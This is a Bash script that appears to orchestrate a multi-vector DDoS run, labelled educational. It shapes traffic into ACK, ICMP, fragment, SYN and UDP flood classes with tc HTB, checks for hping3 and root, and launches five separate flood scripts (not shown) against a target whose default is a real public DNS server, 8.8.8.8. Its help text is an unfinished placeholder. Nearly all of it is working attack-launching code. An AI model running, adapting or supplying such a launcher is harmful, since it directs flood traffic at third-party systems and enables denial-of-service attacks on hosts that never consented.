#!/bin/bash
# =================================================================
# MULTI-VECTOR HTB LAUNCHER FOR EDUCATIONAL PURPOSE
# =================================================================
# Default parameters
TARGET_IP="${1:-8.8.8.8}"
INTERFACE="${2:-br-ex}"
DURATION="${3:-300}"
TIME_COMPRESSION="${4:-288}"
MODE="${5:-python-compressed}"
YOYO_TYPE="${6:-square}"

# HTB Configuration
HTB_TOTAL_BANDWIDTH="128kbit"
HTB_ROOT_HANDLE="1:"
HTB_PARENT_CLASS="1:1"

# Vector Class IDs
CLASS_ACK="1:10"
CLASS_ICMP="1:20"
CLASS_FRAGMENT="1:30"
CLASS_SYN="1:40"
CLASS_UDP="1:50"

# Vector bandwidth allocation
VECTOR_MIN_BW="10kbit"
VECTOR_MAX_BW="128kbit"

# Logging
LOG_FILE="multi_vector_htb_$(date +%Y%m%d_%H%M%S).log"
PIDS=()
HTB_INITIALIZED=false

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] $message" | tee -a "$LOG_FILE"
}

log_color() {
    local color="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${color}[$timestamp] $message${NC}" | tee -a "$LOG_FILE"
}

# Check dependencies
check_dependencies() {
    local missing_deps=()

    if ! command -v hping3 &> /dev/null; then
        missing_deps+=("hping3")
    fi

    if ! command -v bc &> /dev/null; then
        missing_deps+=("bc")
    fi

    if ! command -v tc &> /dev/null; then
        missing_deps+=("iproute2")
    fi

    if [[ $EUID -ne 0 ]]; then
        log_color "$RED" "ERROR: Root privileges required"
        exit 1
    fi

    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_color "$RED" "ERROR: Missing dependencies: ${missing_deps[*]}"
        exit 1
    fi

    if ! ip link show "$INTERFACE" &>/dev/null; then
        log_color "$RED" "ERROR: Interface $INTERFACE does not exist"
        exit 1
    fi

    # Check if vector scripts exist
    local scripts=("simulator_ACK.sh" "simulator_ICMP.sh" "simulator_IP_Fragment.sh" "simulator_SYN.sh" "simulator_UDP.sh")
    for script in "${scripts[@]}"; do
        if [ ! -f "$script" ]; then
            log_color "$RED" "ERROR: Vector script $script not found in current directory"
            exit 1
        fi
    done
}

# Initialize HTB qdisc
init_htb_qdisc() {
    log_color "$BLUE" "=== INITIALIZING HTB QDISC ==="

    # Remove existing qdisc
    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    sleep 1

    # Create root HTB qdisc
    if ! tc qdisc add dev "$INTERFACE" root handle 1: htb default 60; then
        log_color "$RED" "ERROR: Failed to create root HTB qdisc"
        return 1
    fi
    log_color "$GREEN" "Root HTB qdisc created (handle 1:)"

    # Create parent class
    if ! tc class add dev "$INTERFACE" parent 1: classid 1:1 htb rate "$HTB_TOTAL_BANDWIDTH"; then
        log_color "$RED" "ERROR: Failed to create parent class"
        return 1
    fi
    log_color "$GREEN" "Parent class created (1:1) - Total BW: $HTB_TOTAL_BANDWIDTH"

    # Create child classes for each vector
    log_color "$YELLOW" "Creating child classes for attack vectors..."

    for classid in "$CLASS_ACK" "$CLASS_ICMP" "$CLASS_FRAGMENT" "$CLASS_SYN" "$CLASS_UDP"; do
        if ! tc class add dev "$INTERFACE" parent 1:1 classid "$classid" htb rate "$VECTOR_MIN_BW" ceil "$VECTOR_MAX_BW" prio 1; then
            log_color "$RED" "ERROR: Failed to create class $classid"
            return 1
        fi
        log_color "$GREEN" "Class $classid created - Min: $VECTOR_MIN_BW, Max: $VECTOR_MAX_BW"
    done

    # Add filters
    log_color "$YELLOW" "Adding packet classification filters..."

    tc filter add dev "$INTERFACE" parent 1: protocol ip prio 1 u32 match ip protocol 6 0xff match u8 0x10 0xff at nexthdr+13 flowid 1:10 2>/dev/null || true
    tc filter add dev "$INTERFACE" parent 1: protocol ip prio 2 u32 match ip protocol 1 0xff flowid 1:20 2>/dev/null || true
    tc filter add dev "$INTERFACE" parent 1: protocol ip prio 3 u32 match u16 0x2000 0x2000 at 6 flowid 1:30 2>/dev/null || true
    tc filter add dev "$INTERFACE" parent 1: protocol ip prio 4 u32 match ip protocol 6 0xff match u8 0x02 0xff at nexthdr+13 flowid 1:40 2>/dev/null || true
    tc filter add dev "$INTERFACE" parent 1: protocol ip prio 5 u32 match ip protocol 17 0xff flowid 1:50 2>/dev/null || true

    log_color "$GREEN" "Packet classification filters added"

    HTB_INITIALIZED=true
    log_color "$GREEN" "=== HTB QDISC INITIALIZATION COMPLETED ==="

    show_htb_summary
    return 0
}

# HTB Summary function for clean logging
show_htb_summary() {
    log_color "$YELLOW" "=== HTB BANDWIDTH SUMMARY ==="
    printf "%-12s %-22s %-10s %-12s %-18s %-10s\n" "Class" "Sent (bytes/pkt)" "Dropped" "Overlimits" "Backlog (b/p)" "Requeues" | tee -a "$LOG_FILE"
    printf "%-12s %-22s %-10s %-12s %-18s %-10s\n" "------------" "----------------------" "----------" "------------" "------------------" "----------" | tee -a "$LOG_FILE"

    local output=$(tc -s class show dev "$INTERFACE")
    for classid in "1:1" "$CLASS_ACK" "$CLASS_ICMP" "$CLASS_FRAGMENT" "$CLASS_SYN" "$CLASS_UDP"; do
        local block=$(echo "$output" | grep -A 3 "class htb $classid")
        local sent_bytes=$(echo "$block" | grep -o "Sent [0-9]*" | awk '{print $2}')
        local sent_pkt=$(echo "$block" | grep -o "([0-9]* pkt" | tr -d '(')
        local dropped=$(echo "$block" | grep -o "(dropped [0-9]*" | awk '{print $2}')
        local overlimits=$(echo "$block" | grep -o "overlimits [0-9]*" | awk '{print $2}')
        local backlog_b=$(echo "$block" | grep -o "backlog [0-9]*b" | awk '{print $2}')
        local backlog_p=$(echo "$block" | grep -o "[0-9]*p" | head -1 | awk '{print $1}')
        local requeues=$(echo "$block" | grep -o "requeues [0-9]*" | tail -1 | awk '{print $2}')

        sent="${sent_bytes:-0}/${sent_pkt:-0}"
        dropped="${dropped:-0}"
        overlimits="${overlimits:-0}"
        backlog="${backlog_b:-0}/${backlog_p:-0}"
        requeues="${requeues:-0}"

        printf "%-12s %-22s %-10s %-12s %-18s %-10s\n" "$classid" "$sent" "$dropped" "$overlimits" "$backlog" "$requeues" | tee -a "$LOG_FILE"
    done
    log_color "$YELLOW" "================================="
}

# Launch vector scripts
launch_vectors() {
    log_color "$BLUE" "=== LAUNCHING ATTACK VECTORS ==="

    export HTB_MODE="true"
    export HTB_INTERFACE="$INTERFACE"
    export HTB_TOTAL_BANDWIDTH="$HTB_TOTAL_BANDWIDTH"
    export LOG_FILE

    local vectors=("ACK:$CLASS_ACK" "ICMP:$CLASS_ICMP" "Fragment:$CLASS_FRAGMENT" "SYN:$CLASS_SYN" "UDP:$CLASS_UDP")
    local scripts=("simulator_ACK.sh" "simulator_ICMP.sh" "simulator_IP_Fragment.sh" "simulator_SYN.sh" "simulator_UDP.sh")

    for i in "${!vectors[@]}"; do
        local name=$(echo "${vectors[$i]}" | cut -d: -f1)
        local class=$(echo "${vectors[$i]}" | cut -d: -f2)
        local script="${scripts[$i]}"

        log_color "$YELLOW" "Launching $name vector..."
        export HTB_CLASS_ID="$class"
        bash "$script" "$TARGET_IP" "$INTERFACE" "$DURATION" "$TIME_COMPRESSION" "$MODE" "$YOYO_TYPE" &
        PIDS+=($!)
        log_color "$GREEN" "$name vector launched (PID: ${PIDS[-1]}, Class: $class)"
        sleep 2
    done

    log_color "$GREEN" "=== ALL VECTORS LAUNCHED ==="
    log_color "$BLUE" "Active vector PIDs: ${PIDS[*]}"
}

# Monitor vectors
monitor_vectors() {
    log_color "$BLUE" "=== MONITORING VECTORS ==="
    log_color "$YELLOW" "Press Ctrl+C to stop all vectors"

    local check_interval=10
    local elapsed=0

    while [ $elapsed -lt $DURATION ]; do
        sleep $check_interval
        elapsed=$((elapsed + check_interval))

        local running_count=0
        for pid in "${PIDS[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                running_count=$((running_count + 1))
            fi
        done

        log_color "$BLUE" "T+${elapsed}s - Vectors running: $running_count/5"

        if [ $((elapsed % 30)) -eq 0 ]; then
            show_htb_summary
        fi

        if [ $running_count -eq 0 ]; then
            log_color "$YELLOW" "All vectors have stopped"
            break
        fi
    done

    log_color "$GREEN" "=== MONITORING COMPLETED ==="
}

# Cleanup function
cleanup() {
    log_color "$YELLOW" "=== CLEANUP STARTED ==="

    if [ ${#PIDS[@]} -gt 0 ]; then
        log_color "$YELLOW" "Stopping all vector processes..."
        for pid in "${PIDS[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                log_color "$YELLOW" "Terminating PID: $pid"
                kill -TERM "$pid" 2>/dev/null
            fi
        done
        sleep 3
        for pid in "${PIDS[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                log_color "$RED" "Force killing PID: $pid"
                kill -KILL "$pid" 2>/dev/null
            fi
        done
    fi

    if [ "$HTB_INITIALIZED" = true ]; then
        log_color "$YELLOW" "Removing HTB qdisc from interface $INTERFACE"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
        log_color "$GREEN" "HTB qdisc removed"
    fi

    rm -f /tmp/traffic_calculator.py 2>/dev/null || true

    log_color "$GREEN" "=== CLEANUP COMPLETED ==="
    log_color "$BLUE" "Log file: $LOG_FILE"
    exit 0
}

trap cleanup EXIT INT TERM

# Show usage
show_usage() {
    cat << EOF
<USAGE AND HELP TEXT - giữ nguyên như cũ, bạn có thể copy từ script cũ>
EOF
}

# Main function
main() {
    if [[ "$1" == "-h" || "$1" == "--help" || "$1" == "help" ]]; then
        show_usage
        exit 0
    fi

    log_color "$BLUE" "╔═══════════════════════════════════════════════════════════════════════════╗"
    log_color "$BLUE" "║ MULTI-VECTOR HTB DDoS LAUNCHER (EDUCATIONAL PURPOSE)                     ║"
    log_color "$BLUE" "╚═══════════════════════════════════════════════════════════════════════════╝"

    log_color "$YELLOW" "Configuration:"
    log " Target IP: $TARGET_IP"
    log " Interface: $INTERFACE"
    log " Duration: ${DURATION}s"
    log " Compression: ${TIME_COMPRESSION}x"
    log " Mode: $MODE"
    log " Yoyo Type: $YOYO_TYPE"
    log " Total Bandwidth: $HTB_TOTAL_BANDWIDTH"
    log " Per-Vector Min: $VECTOR_MIN_BW"
    log " Per-Vector Max: $VECTOR_MAX_BW"

    check_dependencies

    log_color "$YELLOW" "Testing connectivity to $TARGET_IP..."
    if ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
        log_color "$GREEN" "Target is reachable"
    else
        log_color "$YELLOW" "WARNING: Target may not be reachable"
    fi

    if ! init_htb_qdisc; then
        log_color "$RED" "Failed to initialize HTB qdisc"
        exit 1
    fi

    launch_vectors
    monitor_vectors

    log_color "$GREEN" "=== SIMULATION COMPLETED ==="
    log_color "$BLUE" "Log file: $LOG_FILE"
}

main "$@"
